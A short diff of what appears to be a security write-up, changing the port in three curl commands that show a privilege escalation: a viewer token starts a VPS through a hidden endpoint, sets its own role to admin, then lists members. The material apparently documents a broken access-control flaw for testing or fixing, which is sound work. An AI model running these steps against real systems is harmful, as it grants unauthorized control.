@@ -15,17 +15,17 @@
 
 ```bash
 # Step 1: 发现隐藏接口
-curl -X POST http://localhost:8080/api/v1/vps/1/start \
+curl -X POST http://localhost:5000/api/v1/vps/1/start \
   -H "Authorization: Bearer <viewer-token>"
 # → 200 OK, works!
 
 # Step 2: 修改自身角色
-curl -X PUT http://localhost:8080/api/v1/company/members/<self-id>/role \
+curl -X PUT http://localhost:5000/api/v1/company/members/<self-id>/role \
   -H "Authorization: Bearer <viewer-token>" \
   -d '{"role":"admin"}'
 
 # Step 3: 验证新权限
-curl http://localhost:8080/api/v1/company/members \
+curl http://localhost:5000/api/v1/company/members \
   -H "Authorization: Bearer <viewer-token>"
 ```
 
